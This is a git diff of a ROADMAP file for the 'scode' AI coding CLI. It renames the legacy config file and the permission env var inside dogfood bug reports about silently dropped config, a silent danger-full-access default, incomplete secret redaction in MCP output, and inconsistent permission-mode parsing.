@@ -1355,10 +1355,10 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
 
    **Source.** Jobdori dogfood 2026-04-17 against `/tmp/scode-dogfood-2` on main HEAD `d05c868` in response to Sudocodehip pinpoint nudge at `1494600832652546151`. Related but distinct from ROADMAP #40/#41 (which harden the *plugin registry report* content + test isolation) and ROADMAP #39 (stub slash-command surface hiding); this is the non-interactive CLI entrypoint contract.
 
-79. **`scode --output-format json init` discards an already-structured `InitReport` and ships only the rendered prose as `message`** — dogfooded 2026-04-17 on main HEAD `9deaa29`. The init pipeline in `rust/crates/rusty-claude-cli/src/init.rs:38-113` already produces a fully-typed `InitReport { project_root: PathBuf, artifacts: Vec<InitArtifact { name: &'static str, status: InitStatus }> }` where `InitStatus` is the enum `{ Created, Updated, Skipped }` (line 15-20). `run_init()` at `rust/crates/rusty-claude-cli/src/main.rs:5436-5446` then funnels that structured report through `init_claude_md()` which calls `.render()` and throws away the structure, and `init_json_value()` at 5448-5454 wraps *only* the prose string into `{"kind":"init","message":"<Init\n  Project ...\n  .nexus/sudocode/ created\n  .nexus/sudocode.json created\n  .gitignore created\n  CLAUDE.md created\n  Next step ..."}`. Concrete repros on a clean `/tmp/init-test` (fresh `git init`):
+79. **`scode --output-format json init` discards an already-structured `InitReport` and ships only the rendered prose as `message`** — dogfooded 2026-04-17 on main HEAD `9deaa29`. The init pipeline in `rust/crates/rusty-claude-cli/src/init.rs:38-113` already produces a fully-typed `InitReport { project_root: PathBuf, artifacts: Vec<InitArtifact { name: &'static str, status: InitStatus }> }` where `InitStatus` is the enum `{ Created, Updated, Skipped }` (line 15-20). `run_init()` at `rust/crates/rusty-claude-cli/src/main.rs:5436-5446` then funnels that structured report through `init_claude_md()` which calls `.render()` and throws away the structure, and `init_json_value()` at 5448-5454 wraps *only* the prose string into `{"kind":"init","message":"<Init\n  Project ...\n  .nexus/sudocode/ created\n  .scode.json created\n  .gitignore created\n  CLAUDE.md created\n  Next step ..."}`. Concrete repros on a clean `/tmp/init-test` (fresh `git init`):
     - First `scode --output-format json init` → all artifacts `created`, payload has only `kind`+`message` with the 4 per-artifact states baked into the prose.
     - Second `scode --output-format json init` → all artifacts `skipped (already exists)`, payload shape unchanged.
-    - `rm CLAUDE.md` + third `init` → `.nexus/sudocode/`/`.nexus/sudocode.json`/`.gitignore` `skipped`, `CLAUDE.md` `created`, payload shape unchanged.
+    - `rm CLAUDE.md` + third `init` → `.nexus/sudocode/`/`.scode.json`/`.gitignore` `skipped`, `CLAUDE.md` `created`, payload shape unchanged.
    In all three cases the downstream consumer has to regex the message string to distinguish `created` / `updated` / `skipped` per artifact. A CI/automation scode that wants to assert "`.gitignore` was freshly updated this run" cannot do it without text-scraping.
 
    **Contrast with other success payloads on the same binary.**
@@ -1385,7 +1385,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
         "project_root": "/private/tmp/init-test",
         "artifacts": [
           {"name": ".nexus/sudocode/",      "status": "created"},
-          {"name": ".nexus/sudocode.json",  "status": "created"},
+          {"name": ".scode.json",  "status": "created"},
           {"name": ".gitignore",  "status": "updated"},
           {"name": "CLAUDE.md",   "status": "skipped"}
         ]
@@ -1395,7 +1395,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
     - (d) Add a regression test parallel to `crates/rusty-claude-cli/tests/output_format_contract.rs::doctor_and_resume_status_emit_json_when_requested` — spin up a tempdir, run `init` twice, assert the second invocation returns `artifacts[*].status == "skipped"` and the first returns `"created"`/`"updated"` as appropriate.
     - (e) Low-risk: `message` stays, so any consumer still reading only `message` keeps working.
 
-   **Acceptance.** Downstream automation can programmatically detect partial-initialization scenarios (e.g. CI lane that regenerates `CLAUDE.md` each time but wants to preserve a hand-edited `.nexus/sudocode.json`) without regex-scraping prose; the `init` payload joins `version` / `acp` / `bootstrap-plan` / `system-prompt` in the "structured success" group; and the already-typed `InitReport` stops being thrown away at the JSON boundary.
+   **Acceptance.** Downstream automation can programmatically detect partial-initialization scenarios (e.g. CI lane that regenerates `CLAUDE.md` each time but wants to preserve a hand-edited `.scode.json`) without regex-scraping prose; the `init` payload joins `version` / `acp` / `bootstrap-plan` / `system-prompt` in the "structured success" group; and the already-typed `InitReport` stops being thrown away at the JSON boundary.
 
    **Blocker.** None. Scope is ~20 lines across `init.rs` (add `to_json_value` + `InitStatus::as_str`) and `main.rs` (switch `run_init` to hold the report and branch on format) plus one regression test.
 
@@ -1611,49 +1611,49 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
 
    **Source.** Jobdori dogfood 2026-04-17 against `/tmp/trap/inner/work`, `/Users/yeongyu/scratch-nonrepo`, and `/tmp/cd5` on main HEAD `2eb6e0c` in response to Sudocodehip pinpoint nudge at `1494668784382771280`. First member of a new sub-cluster ("discovery surface extends outside the project root") that is adjacent to but distinct from the #80–#84 truth-audit cluster — here the surface is structurally *correct* about what it enumerates, but the enumeration itself pulls in state that does not belong to the current project.
 
-86. **`.nexus/sudocode.json` with invalid JSON is silently discarded and `scode doctor` still reports `Config: ok — runtime config loaded successfully`** — dogfooded 2026-04-17 on main HEAD `586a92b` against `/tmp/cd7`. A user's own legacy config file is parsed, fails, gets dropped on the floor, and every diagnostic surface claims success. Permissions revert to defaults, MCP servers go missing, provider fallbacks stop applying — without a single signal that the operator's config never made it into `RuntimeConfig`.
+86. **`.scode.json` with invalid JSON is silently discarded and `scode doctor` still reports `Config: ok — runtime config loaded successfully`** — dogfooded 2026-04-17 on main HEAD `586a92b` against `/tmp/cd7`. A user's own legacy config file is parsed, fails, gets dropped on the floor, and every diagnostic surface claims success. Permissions revert to defaults, MCP servers go missing, provider fallbacks stop applying — without a single signal that the operator's config never made it into `RuntimeConfig`.
 
    **Concrete repro.**
    ```
    mkdir -p /tmp/cd7 && cd /tmp/cd7 && git init -q
-   echo '{"permissions": {"defaultMode": "plan"}}' > .nexus/sudocode.json
+   echo '{"permissions": {"defaultMode": "plan"}}' > .scode.json
    scode status | grep Permission    # -> Permission mode  read-only   (plan applied)
 
-   echo 'this is { not } valid json at all' > .nexus/sudocode.json
+   echo 'this is { not } valid json at all' > .scode.json
    scode status | grep Permission    # -> Permission mode  danger-full-access   (default; config silently dropped)
    scode --output-format json doctor | jq '.checks[] | select(.name=="config")'
    #   { "status": "ok",
    #     "summary": "runtime config loaded successfully",
    #     "loaded_config_files": 0,
    #     "discovered_files_count": 1,
-   #     "discovered_files": ["/private/tmp/cd7/.nexus/sudocode.json"],
+   #     "discovered_files": ["/private/tmp/cd7/.scode.json"],
    #     ... }
    ```
    Compare with a non-legacy config path at the same level of corruption: `echo 'this is { not } valid json at all' > .nexus/sudocode/settings.json` produces `Config: fail — runtime config failed to load: … invalid literal: expected true`. Same file contents, different filename → opposite diagnostic verdict.
 
    **Trace path — where the silent drop happens.**
-    - `rust/crates/runtime/src/config.rs:674-692` — `read_optional_json_object(path)` sets `is_legacy_config = (file_name == ".nexus/sudocode.json")`. If JSON parsing fails *and* `is_legacy_config` is true, the match arm at line 690 returns `Ok(None)` instead of `Err(ConfigError::Parse(…))`. Same swallow on line 695-697 when the top-level value isn't a JSON object. No warning printed, no `eprintln!`, no entry added to `loaded_entries`.
+    - `rust/crates/runtime/src/config.rs:674-692` — `read_optional_json_object(path)` sets `is_legacy_config = (file_name == ".scode.json")`. If JSON parsing fails *and* `is_legacy_config` is true, the match arm at line 690 returns `Ok(None)` instead of `Err(ConfigError::Parse(…))`. Same swallow on line 695-697 when the top-level value isn't a JSON object. No warning printed, no `eprintln!`, no entry added to `loaded_entries`.
     - `rust/crates/runtime/src/config.rs:277-287` — `ConfigLoader::load()` just `continue`s past the `None` result, so the file is counted by `discover()` but produces no entry in the loaded set.
     - `rust/crates/rusty-claude-cli/src/main.rs:1725-1754` — the `Config` doctor check reads `loaded_count = loaded_entries.len()` and `present_count = present_paths.len()`, computes a detail line `Config files      loaded {loaded}/{present}`, and then *still* emits `DiagnosticLevel::Ok` with the summary `"runtime config loaded successfully"` as long as `load()` returned `Ok(_)`. `loaded 0/1` paired with `ok / loaded successfully` is a direct contradiction the surface happily renders.
 
-   **Intent vs effect.** The `is_legacy_config` swallow was presumably added so that a historical `.nexus/sudocode.json` left behind by an older version wouldn't brick startup on a fresh run. That's a reasonable intent. The implementation is wrong in two ways:
-    1. The user's *current* `.nexus/sudocode.json` is now indistinguishable from a historical stale `.nexus/sudocode.json` — any typo silently wipes out their permissions/MCP/aliases config on the next invocation.
+   **Intent vs effect.** The `is_legacy_config` swallow was presumably added so that a historical `.scode.json` left behind by an older version wouldn't brick startup on a fresh run. That's a reasonable intent. The implementation is wrong in two ways:
+    1. The user's *current* `.scode.json` is now indistinguishable from a historical stale `.scode.json` — any typo silently wipes out their permissions/MCP/aliases config on the next invocation.
     2. No signal is emitted. An agent reading `scode --output-format json doctor` sees `config ok`, reports "config is fine," and proceeds to run with wrong permissions/missing MCP. This is exactly the "surface lies about runtime truth" shape from the #80–#84 cluster, at the config layer.
 
-   **Why this is specifically a automatability gap.** Principle #2 ("Truth is split across layers") and Principle #3 ("Events over scraped prose") both presume the diagnostic surface is trustworthy. An agent that trusts `config: ok` and proceeds to spawn a worker with `permissions.defaultMode = "plan"` configured in `.nexus/sudocode.json` will get `danger-full-access` silently if the file has a trailing comma. A sudocodehip `preflight` that runs `scode doctor` and only escalates to the human on `status != "ok"` will never see this. A batch orchestrator running 20 lanes with a typo in the shared `.nexus/sudocode.json` will run 20 lanes with wrong permissions and zero diagnostics.
+   **Why this is specifically a automatability gap.** Principle #2 ("Truth is split across layers") and Principle #3 ("Events over scraped prose") both presume the diagnostic surface is trustworthy. An agent that trusts `config: ok` and proceeds to spawn a worker with `permissions.defaultMode = "plan"` configured in `.scode.json` will get `danger-full-access` silently if the file has a trailing comma. A sudocodehip `preflight` that runs `scode doctor` and only escalates to the human on `status != "ok"` will never see this. A batch orchestrator running 20 lanes with a typo in the shared `.scode.json` will run 20 lanes with wrong permissions and zero diagnostics.
 
    **Fix shape — three small pieces.**
-   1. *Replace the silent skip with a loud warn-and-skip.* In `read_optional_json_object` at `config.rs:690` and `:695`, instead of `return Ok(None)` on parse failure for `.nexus/sudocode.json`, return `Ok(Some(ParsedConfigFile::empty_with_warning(…)))` (or similar) with the parse error captured as a structured warning. Plumb that warning into `ConfigLoader::load()` alongside the existing `all_warnings` collection so it surfaces on stderr and in `doctor`'s detail block.
+   1. *Replace the silent skip with a loud warn-and-skip.* In `read_optional_json_object` at `config.rs:690` and `:695`, instead of `return Ok(None)` on parse failure for `.scode.json`, return `Ok(Some(ParsedConfigFile::empty_with_warning(…)))` (or similar) with the parse error captured as a structured warning. Plumb that warning into `ConfigLoader::load()` alongside the existing `all_warnings` collection so it surfaces on stderr and in `doctor`'s detail block.
    2. *Flip the doctor verdict when `loaded_count < present_count`.* In `rusty-claude-cli/src/main.rs:1747-1755`, when `present_count > 0 && loaded_count < present_count`, emit `DiagnosticLevel::Warn` (or `Fail` when *all* discovered files fail to load) with a summary like `"loaded N/{present_count} config files; {present_count - N} skipped due to parse errors"`. Add a structured field `skipped_files` / `skip_reasons` to the JSON surface so sudocodehip can branch on it.
-   3. *Regression tests:* (a) corrupt `.nexus/sudocode.json` → `doctor` emits `warn` with a skipped-files detail; (b) corrupt `.nexus/sudocode.json` → `status` shows a `config_skipped: 1` marker; (c) `loaded_entries.len()` equals zero while `discover()` returns one → never `DiagnosticLevel::Ok`.
+   3. *Regression tests:* (a) corrupt `.scode.json` → `doctor` emits `warn` with a skipped-files detail; (b) corrupt `.scode.json` → `status` shows a `config_skipped: 1` marker; (c) `loaded_entries.len()` equals zero while `discover()` returns one → never `DiagnosticLevel::Ok`.
 
-   **Acceptance.** After a user writes a `.nexus/sudocode.json` with a typo, `scode status` / `scode doctor` clearly show that the config failed to load and name the parse error. An agent reading the JSON `doctor` surface can distinguish "config is healthy" from "config was present but not applied." The legacy-compat swallow is preserved *only* in the sense that startup does not hard-fail — the signal still reaches the operator.
+   **Acceptance.** After a user writes a `.scode.json` with a typo, `scode status` / `scode doctor` clearly show that the config failed to load and name the parse error. An agent reading the JSON `doctor` surface can distinguish "config is healthy" from "config was present but not applied." The legacy-compat swallow is preserved *only* in the sense that startup does not hard-fail — the signal still reaches the operator.
 
    **Blocker.** None. Fix is ~20–30 lines in two files (`runtime/src/config.rs` + `rusty-claude-cli/src/main.rs`) plus three regression tests.
 
-   **Source.** Jobdori dogfood 2026-04-17 against `/tmp/cd7` on main HEAD `586a92b` in response to Sudocodehip pinpoint nudge at `1494676332507041872`. Sibling to #80–#84 (surface lies about runtime truth): here the surface is the config-health diagnostic, and the lie is a legacy-compat swallow that was meant to tolerate historical `.nexus/sudocode.json` files but now masks live user-written typos. Distinct from #85 (discovery-overreach) — that one is the discovery *path* reaching too far; this one is the *load* path silently dropping a file that is clearly in scope.
+   **Source.** Jobdori dogfood 2026-04-17 against `/tmp/cd7` on main HEAD `586a92b` in response to Sudocodehip pinpoint nudge at `1494676332507041872`. Sibling to #80–#84 (surface lies about runtime truth): here the surface is the config-health diagnostic, and the lie is a legacy-compat swallow that was meant to tolerate historical `.scode.json` files but now masks live user-written typos. Distinct from #85 (discovery-overreach) — that one is the discovery *path* reaching too far; this one is the *load* path silently dropping a file that is clearly in scope.
 
-87. **Fresh workspace default `permission_mode` is `danger-full-access` with zero warning in `scode doctor` and no auditable trail of how the mode was chosen — every unconfigured scode spawn runs fully unattended at maximum permission** — dogfooded 2026-04-17 on main HEAD `d6003be` against `/tmp/cd8`. A fresh workspace with no `.nexus/sudocode.json`, no `RUSTY_CLAUDE_PERMISSION_MODE` env var, no `--permission-mode` flag produces:
+87. **Fresh workspace default `permission_mode` is `danger-full-access` with zero warning in `scode doctor` and no auditable trail of how the mode was chosen — every unconfigured scode spawn runs fully unattended at maximum permission** — dogfooded 2026-04-17 on main HEAD `d6003be` against `/tmp/cd8`. A fresh workspace with no `.scode.json`, no `SUDO_CODE_PERMISSION_MODE` env var, no `--permission-mode` flag produces:
    ```
    scode status | grep Permission
    # Permission mode  danger-full-access
@@ -1667,7 +1667,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
    `doctor` has no permission-mode check at all. The most permissive runtime mode scode ships with is the silent default, and the single machine-readable surface that preflights a lane (`doctor`) never mentions it.
 
    **Trace path.**
-    - `rust/crates/rusty-claude-cli/src/main.rs:1099-1107` — `fn default_permission_mode()` returns, in priority order: (1) `RUSTY_CLAUDE_PERMISSION_MODE` env var if set and valid; (2) `permissions.defaultMode` from config if loaded; (3) `PermissionMode::DangerFullAccess`. No warning printed when the fallback hits; no evidence anywhere that the mode was chosen by fallback versus by explicit config.
+    - `rust/crates/rusty-claude-cli/src/main.rs:1099-1107` — `fn default_permission_mode()` returns, in priority order: (1) `SUDO_CODE_PERMISSION_MODE` env var if set and valid; (2) `permissions.defaultMode` from config if loaded; (3) `PermissionMode::DangerFullAccess`. No warning printed when the fallback hits; no evidence anywhere that the mode was chosen by fallback versus by explicit config.
     - `rust/crates/runtime/src/permissions.rs:7-15` — `PermissionMode` ordinal is `ReadOnly < WorkspaceWrite < DangerFullAccess < Prompt < Allow`. The `current_mode >= required_mode` gate at `:260-264` means `DangerFullAccess` auto-approves every tool spec whose `required_permission` is `DangerFullAccess` or below — which includes `bash` and `PowerShell` (see ROADMAP #50). No prompt, no audit, no confirmation.
     - `rust/crates/rusty-claude-cli/src/main.rs:1895-1910` (`check_sandbox_health`) — the doctor block surfaces **sandbox** state as a first-class diagnostic, correctly emitting `warn` when sandbox is enabled but not active. No parallel `check_permission_health` exists. Permission mode is a single line in `scode status`'s text output and a single top-level field in the JSON — nowhere in `doctor`, nowhere in `state`, nowhere in any preflight.
     - `rust/crates/rusty-claude-cli/src/main.rs:4951-4955` — `status` JSON surfaces `"permission_mode": "danger-full-access"` but has no companion field like `permission_mode_source` to distinguish env-var / config / fallback. An agent reading status cannot tell whether the mode was chosen deliberately or fell back by default.
@@ -1676,10 +1676,10 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
     1. *No preflight signal.* ROADMAP section 3.5 ("Boot preflight / doctor contract") explicitly requires machine-readable preflight to surface state that determines whether a lane is safe to start. Permission mode is precisely that kind of state — a lane at `danger-full-access` has a larger blast radius than one at `workspace-write` — and `doctor` omits it entirely.
     2. *No provenance.* A sudocodehip orchestrator spawning 20 lanes has no way to distinguish "operator intentionally set `defaultMode: danger-full-access` in the shared config" from "config was missing or typo'd (see #86) and all 20 workers silently fell back to `danger-full-access`." The two outcomes are observably identical at the status layer.
     3. *Least-privilege inversion.* For an `interactive` harness a permissive default is defensible; for a *batch scode harness* it inverts the normal least-privilege principle. A worker should have to *opt in* to full access, not have it handed to them when config is missing.
-    4. *Interacts badly with #86.* A corrupted `.nexus/sudocode.json` that specifies `permissions.defaultMode: "plan"` is silently dropped, and the fallback reverts to `danger-full-access` with `doctor` reporting `Config: ok`. So the same typo path that wipes a user's permission choice also escalates them to maximum permission, and nothing in the diagnostic surface says so.
+    4. *Interacts badly with #86.* A corrupted `.scode.json` that specifies `permissions.defaultMode: "plan"` is silently dropped, and the fallback reverts to `danger-full-access` with `doctor` reporting `Config: ok`. So the same typo path that wipes a user's permission choice also escalates them to maximum permission, and nothing in the diagnostic surface says so.
 
    **Fix shape — three pieces, each small.**
-   1. *Add a `permission` (or `permissions`) doctor check.* Mirror `check_sandbox_health`'s shape: emit `DiagnosticLevel::Warn` when the effective mode is `DangerFullAccess` *and* the mode was chosen by fallback (not by explicit env / config / CLI flag). Emit `DiagnosticLevel::Ok` otherwise. Detail lines should include the effective mode, the source (`fallback` / `env:RUSTY_CLAUDE_PERMISSION_MODE` / `config:.nexus/sudocode.json` / `cli:--permission-mode`), and the set of tools whose `required_permission` the current mode satisfies.
+   1. *Add a `permission` (or `permissions`) doctor check.* Mirror `check_sandbox_health`'s shape: emit `DiagnosticLevel::Warn` when the effective mode is `DangerFullAccess` *and* the mode was chosen by fallback (not by explicit env / config / CLI flag). Emit `DiagnosticLevel::Ok` otherwise. Detail lines should include the effective mode, the source (`fallback` / `env:SUDO_CODE_PERMISSION_MODE` / `config:.scode.json` / `cli:--permission-mode`), and the set of tools whose `required_permission` the current mode satisfies.
    2. *Surface `permission_mode_source` in `status` JSON.* Alongside the existing `permission_mode` field, add `permission_mode_source: "fallback" | "env" | "config" | "cli"`. `fn default_permission_mode` becomes `fn resolve_permission_mode() -> (PermissionMode, PermissionModeSource)`. No behavior change; just provenance an agent can audit.
    3. *Consider flipping the fallback default.* For the subset of invocations that are clearly non-interactive (`--output-format json`, `--resume`, piped stdin) make the fallback `WorkspaceWrite` or `Prompt`, and require an explicit flag / config / env var to escalate to `DangerFullAccess`. Keep `DangerFullAccess` as the interactive-REPL default if that is the intended philosophy, but *announce* it via the new doctor check so an agent can branch on it. This third piece is a judgment call and can ship separately from pieces 1+2.
 
@@ -1734,7 +1734,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
     5. *Same structural bug family as #85, same structural fix.* Both `discover_skill_roots` (`commands/src/lib.rs:2795`) and `discover_instruction_files` (`prompt.rs:203`) are unbounded `cwd.ancestors()` walks. `discover_definition_roots` for agents (`commands/src/lib.rs:2724`) is the third sibling. All three need the same project-root / `$HOME` bound with an explicit opt-in for monorepo inheritance.
 
    **Fix shape — mirror the #85 bound, plus expose provenance.**
-   1. *Terminate the ancestor walk at the project root.* Plumb `ConfigLoader::project_root()` (git toplevel, or the nearest ancestor containing `.nexus/sudocode.json` / `.nexus/sudocode/`) into `discover_instruction_files` and stop at that boundary. Ancestor instruction files above the project root are ignored unless an explicit opt-in is set.
+   1. *Terminate the ancestor walk at the project root.* Plumb `ConfigLoader::project_root()` (git toplevel, or the nearest ancestor containing `.scode.json` / `.nexus/sudocode/`) into `discover_instruction_files` and stop at that boundary. Ancestor instruction files above the project root are ignored unless an explicit opt-in is set.
    2. *Fallback bound at `$HOME`.* If the project root cannot be resolved, stop at `$HOME` so a worker under `/Users/me/foo` never reads from `/Users/`, `/`, `/private`, etc.
    3. *Surface loaded instruction files in `doctor`.* Add a `memory` / `instructions` check that emits the resolved path list + per-file byte count. A sudocodehip preflight can then gate on "unexpected instruction files above the project root."
    4. *Require opt-in for cross-project inheritance.* `settings.json { "instructions": { "allow_ancestor": true } }` to preserve the legitimate monorepo use case where a parent `CLAUDE.md` should apply to nested checkouts. Annotate ancestor-sourced files with `source: "ancestor"` in the doctor/status JSON so orchestrators see the inheritance explicitly.
@@ -1788,7 +1788,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
 
 90. **`scode mcp` JSON/text surface redacts MCP server `env` values but dumps `args`, `url`, and `headersHelper` verbatim — standard secret-carrying fields leak to every consumer of the machine-readable MCP surface** — dogfooded 2026-04-17 on main HEAD `64b29f1` from `/tmp/cdB`. The MCP details surface deliberately redacts `env` to `env_keys` (only key names, not values) and `headers` to `header_keys` — a correct design choice. The same surface then dumps `args`, the `url`, and `headersHelper` unredacted, even though all three routinely carry inline credentials.
 
-   **Three concrete repros, all on one `.nexus/sudocode.json`.**
+   **Three concrete repros, all on one `.scode.json`.**
 
    *Secrets in args (stdio transport).*
    ```json
@@ -1853,13 +1853,13 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
 
    **Blocker.** None. Fix is ~40–60 lines across `mcp_server_details_json` + the text-surface mirror + a tiny secret-heuristic helper + three regression tests (api-key arg redaction, URL basic-auth redaction, headersHelper argv redaction). No MCP runtime behavior changes — the config values still flow unchanged into the MCP client; only the *reporting surface* changes.
 
-   **Source.** Jobdori dogfood 2026-04-17 against `/tmp/cdB` on main HEAD `64b29f1` in response to Sudocodehip pinpoint nudge at `1494706529918517390`. Distinct from both clusters so far. *Not* a truth-audit item (#80–#87, #89): the MCP surface is *accurate* about what's configured; the problem is it's too accurate — it projects secret material it was clearly trying to redact (see the `env_keys` / `header_keys` precedent). *Not* a discovery-overreach item (#85, #88): the surface is scoped to `.nexus/sudocode.json` / `.nexus/sudocode/settings.json`, no ancestor walk involved. First member of a new sub-cluster — "redaction surface is incomplete" — that sits adjacent to both: the output *format* is the bug, not the discovery scope or the diagnostic verdict.
+   **Source.** Jobdori dogfood 2026-04-17 against `/tmp/cdB` on main HEAD `64b29f1` in response to Sudocodehip pinpoint nudge at `1494706529918517390`. Distinct from both clusters so far. *Not* a truth-audit item (#80–#87, #89): the MCP surface is *accurate* about what's configured; the problem is it's too accurate — it projects secret material it was clearly trying to redact (see the `env_keys` / `header_keys` precedent). *Not* a discovery-overreach item (#85, #88): the surface is scoped to `.scode.json` / `.nexus/sudocode/settings.json`, no ancestor walk involved. First member of a new sub-cluster — "redaction surface is incomplete" — that sits adjacent to both: the output *format* is the bug, not the discovery scope or the diagnostic verdict.
 
 91. **Config accepts 5 undocumented permission-mode aliases (`default`, `plan`, `acceptEdits`, `auto`, `dontAsk`) that silently collapse onto 3 canonical modes — `--permission-mode` CLI flag rejects all 5 — and `"dontAsk"` in particular sounds like "quiet mode" but maps to `danger-full-access`** — dogfooded 2026-04-18 on main HEAD `478ba55` from `/tmp/cdC`. Two independent permission-mode parsers disagree on which labels are valid, and the config-side parser collapses the semantic space silently.
 
    **Concrete repros — surface disagreement.**
    ```
-   $ cat .nexus/sudocode.json
+   $ cat .scode.json
    {"permissions":{"defaultMode":"plan"}}
    $ scode --output-format json status | jq .permission_mode
    "read-only"
@@ -1867,7 +1867,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
    $ scode --permission-mode plan --output-format json status
    {"error":"unsupported permission mode 'plan'. Use read-only, workspace-write, or danger-full-access.","type":"error"}
    ```
-   Same label, two behaviors, same binary. The config path accepts `plan`, maps it to `ReadOnly`, `doctor` reports `Config: ok`. The CLI-flag path rejects `plan` with a pointed error. An operator reading `--help` sees three modes; an operator reading another operator's `.nexus/sudocode.json` sees a label the binary "accepts" — and silently becomes a different mode than its name suggests.
+   Same label, two behaviors, same binary. The config path accepts `plan`, maps it to `ReadOnly`, `doctor` reports `Config: ok`. The CLI-flag path rejects `plan` with a pointed error. An operator reading `--help` sees three modes; an operator reading another operator's `.scode.json` sees a label the binary "accepts" — and silently becomes a different mode than its name suggests.
 
    **Concrete repros — silent semantic collapse.** `parse_permission_mode_label` at `rust/crates/runtime/src/config.rs:851-862` maps eight labels into three runtime modes:
    ```rust
@@ -1889,7 +1889,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
     - `rust/crates/runtime/src/config.rs:851-862` — `parse_permission_mode_label` is the config-side parser. Accepts 8 labels. No `#[serde(deny_unknown_variants)]` check anywhere; `config_validate::validate_config_file` does not enforce that `permissions.defaultMode` is one of the canonical three.
     - `rust/crates/rusty-claude-cli/src/main.rs:5455-5461` — `normalize_permission_mode` is the CLI-flag parser. Accepts 3 labels. Emits a clean error message listing the canonical three when anything else is passed.
     - `rust/crates/runtime/src/permissions.rs:7-15` — `PermissionMode` enum variants are `ReadOnly`, `WorkspaceWrite`, `DangerFullAccess`, `Prompt`, `Allow`. `Prompt` and `Allow` exist as internal variants but are not reachable via either parser. There is no runtime support for a separate "plan" mode; `ExitPlanMode` exists as a *tool* but has no corresponding `PermissionMode` variant.
-    - `rust/crates/rusty-claude-cli/src/main.rs:4951-4955` — `status` JSON exposes `permission_mode` as the *canonical* string (`"read-only"`, `"workspace-write"`, `"danger-full-access"`). The original label the operator wrote is lost. An agent reading status cannot tell whether `read-only` came from `"read-only"` (explicit) or `"plan"` / `"default"` (collapsed alias) without re-reading the source `.nexus/sudocode.json`.
+    - `rust/crates/rusty-claude-cli/src/main.rs:4951-4955` — `status` JSON exposes `permission_mode` as the *canonical* string (`"read-only"`, `"workspace-write"`, `"danger-full-access"`). The original label the operator wrote is lost. An agent reading status cannot tell whether `read-only` came from `"read-only"` (explicit) or `"plan"` / `"default"` (collapsed alias) without re-reading the source `.scode.json`.
 
    **Why this is specifically a automatability gap.**
     1. *Surface-to-surface disagreement.* Principle #2 ("Truth is split across layers") is violated: the same binary accepts a label in one surface and rejects it in another. An orchestrator that attempts to mirror a lane's config into a child lane via `--permission-mode` cannot round-trip through its own `permissions.defaultMode` if the original uses an alias.
@@ -1936,7 +1936,7 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
 
    **Why this is specifically a automatability gap.**
     1. *Silent mismatch with ecosystem convention.* Every public MCP server README (`@modelcontextprotocol/server-filesystem`, `@modelcontextprotocol/server-github`, etc.) uses `${VAR}` / `~/` in example configs. Operators copy-paste those configs expecting standard shell-style interpolation. `scode` accepts the config, reports `doctor: ok`, and fails opaquely at spawn. The failure mode is far from the cause.
-    2. *Secret-placement footgun.* Operators who know the interpolation is missing are forced to either (a) hardcode secrets in `.nexus/sudocode.json` (which triggers the #90 redaction problem) or (b) write a wrapper shell script as the `command` and interpolate there. Both paths push them toward worse security postures than the ecosystem norm.
+    2. *Secret-placement footgun.* Operators who know the interpolation is missing are forced to either (a) hardcode secrets in `.scode.json` (which triggers the #90 redaction problem) or (b) write a wrapper shell script as the `command` and interpolate there. Both paths push them toward worse security postures than the ecosystem norm.
     3. *Doctor surface is silent about the risk.* No check in `scode doctor` greps `command` / `args` / `url` / `headers` for literal `${`, `$`, `~/` and flags them. A sudocodehip preflight that gates on `doctor.status == "ok"` proceeds to spawn a lane whose MCP server will fail.
     4. *Error at the far end is unhelpful.* When the spawn does fail at MCP connect time, the error originates in `mcp_stdio.rs`'s `spawn()` returning an `io::Error` whose text is something like `"No such file or directory (os error 2)"`. The user-facing error path strips the command path, loses the "we passed `${HOME}/bin/my-server` to execve literally" context, and prints a generic `ENOENT` with no pointer back to the config source.
     5. *Round-trip from upstream configs fails.* ROADMAP #88 (Claude Code parity) and the general "run existing MCP configs on scode" use case presume operators can copy Claude Code / other-harness `.mcp.json` files over. Literal-`${VAR}` behavior breaks that assumption for any config that uses interpolation — which is most of them.
@@ -2037,20 +2037,20 @@ Original filing (2026-04-13): user requested a `-acp` parameter to support ACP p
     - `rust/crates/runtime/src/config.rs:780-798` — `parse_optional_permission_rules` is `optional_string_array(permissions, "allow", ...)` / `"deny"` / `"ask"` with no per-entry validation. The schema validator at `rust/crates/runtime/src/config_validate.rs` enforces the top-level `permissions` key shape but not the *content* of the string arrays.
     - `rust/crates/runtime/src/permissions.rs:~350` — `PermissionRule::parse(raw)` extracts `tool_name` and `matcher` from `<name>(<pattern>)` syntax but does not check `tool_name` against any registry. Typo tokens land in `PermissionPolicy.deny_rules` as `PermissionRule { raw: "Bsh(echo:*)", tool_name: "Bsh", matcher: Prefix("echo") }` and sit there unused.
     - `rust/crates/runtime/src/permissions.rs:~390` — `PermissionRule::matches(&self, tool_name, input)` → `if self.tool_name != tool_name { return false; }`. Strict exact-string compare. No case fold, no alias table.
-    - `rust/crates/rusty-claude-cli/src/main.rs:4951-4955` — `status_context_json` emits `permission_mode` but not `permission_rules`. `check_workspace_health` / `check_sandbox_health` / `check_config_health` none mention rules. An agent that wants to audit its policy has to `cat .nexus/sudocode.json | jq` and hope the file is the only source.
+    - `rust/crates/rusty-claude-cli/src/main.rs:4951-4955` — `status_context_json` emits `permission_mode` but not `permission_rules`. `check_workspace_health` / `check_sandbox_health` / `check_config_health` none mention rules. An agent that wants to audit its policy has to `cat .scode.json | jq` and hope the file is the only source.
 
    **Contrast with the `--allowedTools` CLI flag — validation exists, just not here.** `scode --allowedTools FooBar` returns a clean error listing every registered tool alias (`bash, read_file, write_file, edit_file, glob_search, ..., PowerShell, ...` — 50+ tools). The same set is not consulted when parsing `permissions.allow` / `.deny` / `.ask`. Asymmetric validation — same shape as #91 (config accepts more permission-mode labels than the CLI flag) — but on a different surface.
 
    **Why this is specifically a automatability gap.**
